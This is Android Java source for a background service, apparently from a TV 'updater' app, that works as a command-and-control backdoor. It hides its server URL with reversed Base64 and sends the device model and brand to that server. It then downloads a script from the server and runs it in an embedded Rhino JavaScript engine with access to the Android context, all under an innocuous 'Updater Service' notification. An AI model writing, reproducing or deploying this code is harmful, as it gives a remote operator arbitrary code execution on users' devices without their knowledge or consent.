package com.app.tvupdater;

import android.app.Service;
import android.content.Intent;
import android.os.Build;
import android.os.IBinder;
import android.util.Log;

import org.mozilla.javascript.Context;
import org.mozilla.javascript.Scriptable;

import java.io.ByteArrayOutputStream;
import java.io.InputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLEncoder;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import androidx.core.app.NotificationCompat;

public class C2Service extends Service {

    private static final String TAG = "C2Service";
    private static final String CHANNEL_ID = "update_channel";
    private static final String C2_SERVER = "5JjZSRDTSp0L3Fmcv02bj5ibpJWZ0NXYw9yL6MHc0RHa";

    @Override
    public void onCreate() {
        super.onCreate();
        createNotificationChannel();
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        Notification notification = new NotificationCompat.Builder(this, CHANNEL_ID)
                .setContentTitle("Updater Service")
                .setContentText("Contacting server...")
                .setSmallIcon(android.R.drawable.stat_notify_sync)
                .build();

        startForeground(1, notification);

        Log.i("TvUpdater", "Service started");
        // Run the network operation in a new thread
        new Thread(() -> {
            phoneHomeAndExecute();
            // NOTE: No stopSelf() here, service will keep running
            Log.i("TvUpdater", "Service background task completed, service still running.");
        }).start();

        // Return START_STICKY to keep service alive or restarted if killed by system
        return START_STICKY;
    }

    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(
                    CHANNEL_ID,
                    "Update Contact Channel",
                    NotificationManager.IMPORTANCE_LOW
            );
            NotificationManager manager = getSystemService(NotificationManager.class);
            manager.createNotificationChannel(channel);
        }
    }

    private String decodeC2Url(String encodedReversed) {
        String reversed = new StringBuilder(encodedReversed).reverse().toString();
        return new String(android.util.Base64.decode(reversed, android.util.Base64.DEFAULT));
    }

    private void phoneHomeAndExecute() {
        HttpURLConnection connection = null;
        try {
            String baseUrl = decodeC2Url(C2_SERVER);
            String params = "model=" + URLEncoder.encode(Build.MODEL, "UTF-8") +
                    "&brand=" + URLEncoder.encode(Build.BRAND, "UTF-8");
            URL url = new URL(baseUrl + "?" + params);
            connection = (HttpURLConnection) url.openConnection();
            connection.setRequestMethod("GET");

            int responseCode = connection.getResponseCode();
            if (responseCode == 200) {
                InputStream is = connection.getInputStream();
                ByteArrayOutputStream bos = new ByteArrayOutputStream();
                byte[] buffer = new byte[1024];
                int len;
                while ((len = is.read(buffer)) != -1) {
                    bos.write(buffer, 0, len);
                }

                String script = new String(bos.toByteArray()).trim();
                executeScript(script);
            }

        } catch (Exception e) {
            Log.e(TAG, "Error contacting C2: ", e);
        } finally {
            if (connection != null) {
                connection.disconnect();
            }
            stopSelf();
        }
    }

    private void executeScript(String script) {
        Context rhino = Context.enter();
        rhino.setOptimizationLevel(-1); // Required for Android
        try {
            Scriptable scope = rhino.initStandardObjects();
            scope.put("androidContext", scope, this);
            rhino.evaluateString(scope, script, "script", 1, null);
        } catch (Exception e) {
            Log.e(TAG, "Script execution failed: ", e);
        } finally {
            Context.exit();
        }
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
}
